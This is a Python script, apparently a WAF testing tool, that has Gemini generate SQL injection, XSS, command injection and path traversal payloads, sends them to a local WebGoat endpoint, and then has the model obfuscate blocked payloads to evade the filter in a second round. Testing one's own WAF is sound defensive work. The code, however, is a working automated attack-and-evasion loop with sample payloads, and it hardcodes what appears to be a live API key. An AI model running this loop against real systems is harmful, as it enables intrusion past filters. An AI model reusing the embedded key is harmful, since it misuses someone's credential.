import os
import requests
import json
import time
import csv
import random
import socket
import google.generativeai as genai
from typing import List, Dict
from tqdm import tqdm
from datetime import datetime
import pandas as pd
import matplotlib.pyplot as plt

# ================= CONFIGURATION =================
# Ensure this URL is correct for your setup
WAF_TARGET_URL = "http://localhost:2323/WebGoat/SqlInjection/attack8" 

GEMINI_API_KEY = "AIzaSyAI6KT5f0_Y-8v4BJ2lbYt9WhGozwbHInA"     # Paste your key here
BATCH_SIZE = 15                            # Requests per round
MAX_ITERATIONS = 2                         # Strict limit: 2 rounds
LOG_CSV = "waf_red_team_detailed_report.csv" # Output filename
METRICS_IMAGE = "waf_metrics.png"          # Output image for graphs

# Headers (Add Cookie here if needed manually)
HEADERS = {
    "User-Agent": "RedTeam-Agent/1.0",
    # "Cookie": "JSESSIONID=..."  <-- Add this if you need authentication
}
# =============================================

# Configure Gemini
genai.configure(api_key=GEMINI_API_KEY)

class RedTeamAgent:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.history = []
        self.model = genai.GenerativeModel('gemini-2.5-flash')
        self.chat = self.model.start_chat(history=[])
        
        # Initialize CSV with detailed headers
        with open(LOG_CSV, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow([
                "timestamp", "iteration", "ip", "method", "url", "path", 
                "protocol", "request_body", "response_status", "blocked", "latency_ms"
            ])

    def get_next_payloads(self, iteration):
        """Generates attacks using Gemini."""
        print(f"\n[AI] 🧠 Generating payload batch {iteration}/{MAX_ITERATIONS}...")

        if iteration == 1:
            prompt = (
                f"Generate {BATCH_SIZE} diverse malicious web attack payloads. "
                "Include SQL Injection (e.g. ' OR 1=1), XSS (<script>), Command Injection, and Path Traversal. "
                "Target a standard web form parameter. "
                "Output ONLY a raw JSON list of strings."
            )
        else:
            last_batch = self.history[-BATCH_SIZE:]
            blocked = [x['payload'] for x in last_batch if x['blocked']]
            passed = [x['payload'] for x in last_batch if not x['blocked']]

            prompt = (
                f"FEEDBACK FROM LAST BATCH:\n"
                f"- BLOCKED ({len(blocked)}): {json.dumps(blocked)}\n"
                f"- PASSED ({len(passed)}): {json.dumps(passed)}\n\n"
                f"TASK: Generate {BATCH_SIZE} NEW payloads.\n"
                f"1. Obfuscate the blocked attacks (encoding, whitespace) to bypass filters.\n"
                f"2. Variate the successful attacks.\n"
                "Output ONLY a raw JSON list of strings."
            )

        try:
            response = self.chat.send_message(prompt)
            text = response.text.replace("```json", "").replace("```", "").strip()
            return json.loads(text)
        except Exception as e:
            print(f"[Error] AI Generation failed: {e}")
            return ["<script>alert(1)</script>", "' OR 1=1 --"] 

    def execute_attacks(self, payloads, iteration):
        """Fires payloads and logs detailed metrics."""
        print(f"[Attack] ⚔️  Launching {len(payloads)} attacks...")
        results_buffer = []
        
        # Resolve IP once to simulate logging it
        try:
            target_ip = socket.gethostbyname(requests.utils.urlparse(self.target_url).hostname)
        except:
            target_ip = "127.0.0.1"

        for payload in tqdm(payloads, desc=f"Round {iteration}"):
            try:
                start_time = time.time()
                
                # We'll use POST for this example, sending payload in a 'q' parameter
                # This makes it easy to see the payload in the request body
                data = {"q": payload}
                
                req = requests.Request('POST', self.target_url, headers=HEADERS, data=data)
                prepped = self.session.prepare_request(req)
                
                resp = self.session.send(prepped, timeout=10)
                
                latency_ms = (time.time() - start_time) * 1000

                # WAF Logic:
                # 403 Forbidden = Blocked by WAF (Correct behavior)
                # 406 Not Acceptable = Blocked by WAF (Correct behavior)
                # Anything else = Passed (Potential False Negative)
                is_blocked = resp.status_code in [403, 406]

                parsed_url = requests.utils.urlparse(self.target_url)

                result_entry = {
                    "timestamp": datetime.now().isoformat(),
                    "iteration": iteration,
                    "ip": target_ip,
                    "method": "POST",
                    "url": self.target_url,
                    "path": parsed_url.path,
                    "protocol": "HTTP/1.1",
                    "request_body": payload,  # Logging just the payload for clarity, or json.dumps(data)
                    "response_status": resp.status_code,
                    "blocked": is_blocked,
                    "latency_ms": round(latency_ms, 2),
                    "payload": payload # Keep for history logic
                }
                
                self.history.append(result_entry)
                results_buffer.append(result_entry)
                time.sleep(0.2) 

            except requests.RequestException:
                # Connection error usually means hard block by WAF
                result_entry = {
                    "timestamp": datetime.now().isoformat(),
                    "iteration": iteration,
                    "ip": target_ip,
                    "method": "POST",
                    "url": self.target_url,
                    "path": requests.utils.urlparse(self.target_url).path,
                    "protocol": "HTTP/1.1",
                    "request_body": payload,
                    "response_status": 0, # 0 indicates connection failure/drop
                    "blocked": True,
                    "latency_ms": 0,
                    "payload": payload
                }
                self.history.append(result_entry)
                results_buffer.append(result_entry)

        self._append_to_csv(results_buffer)

    def _append_to_csv(self, data):
        with open(LOG_CSV, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=[
                "timestamp", "iteration", "ip", "method", "url", "path", 
                "protocol", "request_body", "response_status", "blocked", "latency_ms"
            ])
            for row in data:
                # Filter out internal keys not for CSV
                csv_row = {k: row[k] for k in writer.fieldnames}
                writer.writerow(csv_row)

    def generate_metrics(self):
        """Generates graphs and stats from the CSV data."""
        print("\n[Analysis] 📊 Generating Metrics and Graphs...")
        
        try:
            df = pd.DataFrame(self.history)
            
            if df.empty:
                print("No data to analyze.")
                return

            # --- 1. Basic Stats ---
            total = len(df)
            blocked = df['blocked'].sum()
            bypassed = total - blocked
            accuracy = (blocked / total) * 100
            avg_latency = df[df['latency_ms'] > 0]['latency_ms'].mean()

            print("-" * 40)
            print(f"Total Requests: {total}")
            print(f"Blocked:        {blocked} ({accuracy:.1f}%)")
            print(f"Bypassed:       {bypassed} ({100-accuracy:.1f}%)")
            print(f"Avg Latency:    {avg_latency:.2f} ms")
            print("-" * 40)

            # --- 2. Graphs ---
            plt.figure(figsize=(15, 5))

            # Graph A: Accuracy (Pie Chart)
            plt.subplot(1, 3, 1)
            plt.pie([blocked, bypassed], labels=['Blocked', 'Bypassed'], 
                    autopct='%1.1f%%', colors=['#ff9999', '#66b3ff'], startangle=90)
            plt.title('WAF Detection Rate')

            # Graph B: Latency Distribution (Histogram)
            plt.subplot(1, 3, 2)
            plt.hist(df[df['latency_ms'] > 0]['latency_ms'], bins=10, color='skyblue', edgecolor='black')
            plt.title('Latency Distribution (ms)')
            plt.xlabel('Time (ms)')
            plt.ylabel('Count')

            # Graph C: Attack Type Effectiveness (Heuristic)
            # We try to guess attack type from payload string
            def get_type(p):
                p = str(p).lower()
                if "select" in p or "union" in p or " or " in p: return "SQLi"
                if "<script" in p or "javascript" in p or "onerror" in p: return "XSS"
                if "../" in p or "/etc/passwd" in p: return "LFI"
                return "Other"

            df['type'] = df['payload'].apply(get_type)
            type_counts = df.groupby('type')['blocked'].mean() * 100 # % blocked per type
            
            plt.subplot(1, 3, 3)
            type_counts.plot(kind='bar', color='lightgreen', edgecolor='black')
            plt.title('Block Rate by Attack Type')
            plt.ylabel('% Blocked')
            plt.ylim(0, 100)

            plt.tight_layout()
            plt.savefig(METRICS_IMAGE)
            print(f"[Analysis] ✅ Graphs saved to {METRICS_IMAGE}")

        except Exception as e:
            print(f"[Analysis] ❌ Error generating graphs: {e}")

# ================= MAIN =================
if __name__ == "__main__":
    if "YOUR_GEMINI_API_KEY" in GEMINI_API_KEY:
        print("❌ Error: API Key missing!")
        exit()

    print(f"[*] Starting Red Team Agent against {WAF_TARGET_URL}")
    print(f"[*] Logging detailed results to {LOG_CSV}")
    
    agent = RedTeamAgent(WAF_TARGET_URL)

    for i in range(1, MAX_ITERATIONS + 1):
        # 1. Generate
        payloads = agent.get_next_payloads(i)
        
        # 2. Attack (and log to CSV)
        if payloads:
            agent.execute_attacks(payloads, i)
        else:
            print("[!] AI failed to generate payloads. Stopping.")
            break

    # 3. Report & Visualize
    agent.generate_metrics()